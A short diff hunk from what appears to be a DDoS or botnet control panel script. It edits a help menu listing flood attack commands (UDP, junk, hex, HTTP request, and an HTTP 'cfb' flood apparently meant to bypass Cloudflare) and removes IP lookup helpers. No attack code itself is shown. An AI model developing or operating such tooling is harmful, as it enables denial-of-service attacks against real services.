@@ -89,9 +89,7 @@ methods = f"""{lightwhite}!udp               {gray}UDP Flood
 {lightwhite}!junk              {gray}Junk flood
 {lightwhite}!hex               {gray}Hex Flood            
 {lightwhite}!http_cfb          {gray}Http cfb Flood       
-{lightwhite}!http_req          {gray}Http req Flood       
-{lightwhite}!url_to_ip         {gray}Get Ip from URL      
-{lightwhite}!ip_to_location    {gray}Get info from Ip"""
+{lightwhite}!http_req          {gray}Http req Flood"""       
 
 admin_methods = f"""{lightwhite}!register               {gray}Starts registration server
 {lightwhite}!user               {gray}Add/remove users"""
